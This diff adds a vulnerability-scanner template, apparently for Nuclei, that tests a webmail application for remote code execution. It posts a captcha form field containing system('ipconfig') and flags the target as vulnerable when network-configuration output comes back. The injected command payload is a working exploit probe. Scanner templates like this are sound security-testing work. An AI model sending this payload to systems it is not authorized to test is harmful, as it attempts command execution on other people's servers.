@@ -1,0 +1,27 @@
+id: webmail-basic-RCE
+info:
+  name: Webmail Basic RCE
+  author: SirBugs
+  severity: Critical
+
+requests:
+  - raw:
+      - |
+        POST /webmail/basic/ HTTP/2
+        Host: {{BaseURL}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0
+        Upgrade-Insecure-Requests: 1
+        Accept: text/html,application/xhtml+xml,application/xml;q-0.9,image/avif,image/webp,image/apng,*/*,q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 43
+
+        _dlg[captcha][target]=system(\'ipconfig\')\
+    matchers:
+      - type: word
+        condition: and
+        words:
+          - "IP Address"
+          - "Subnet Mask"
+          - "Default Gateway"
